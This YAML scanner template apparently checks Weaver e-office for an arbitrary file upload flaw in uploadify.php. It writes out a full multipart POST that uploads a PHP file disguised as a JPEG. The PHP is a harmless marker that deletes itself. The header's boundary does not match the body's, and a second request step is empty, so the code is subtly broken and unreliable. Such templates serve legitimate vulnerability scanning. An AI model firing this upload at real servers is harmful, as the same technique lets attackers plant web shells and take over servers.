app: Weaver
query: app:"Weaver"
meta:
  name: 泛微OA e-office平台uploadify.php任意文件上传漏洞
  level: 4
  tags:
  - file_upload
  description: 泛微OA e-office平台uploadify.php处存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。
  homepage: ""
  author: X prism
  references: ""
  solution: 安装补丁、升级至最新版
  create_at: "2024-07-13 12:05:49"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /inc/jquery/uploadify/uploadify.php
          redirect: true
          header:
          - Content-Type: multipart/form-data; boundary=gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s
          params: |-
            --e64bdf16c554bbc109cecef6451c26a4
            Content-Disposition: form-data; name="Filedata"; filename="2TrZmO0y0SU34qUcUGHA8EXiDgN.php"
            Content-Type: image/jpeg

            <?php echo "2TrZmO0y0SU34qUcUGHA8EXiDgN";unlink(__FILE__);?>

            --e64bdf16c554bbc109cecef6451c26a4--
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: \d+(\.\d+)?
          type: regex
      - request:
          method: POST
          path: ""
          redirect: true
          header: []
          params: ""
        response: []
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
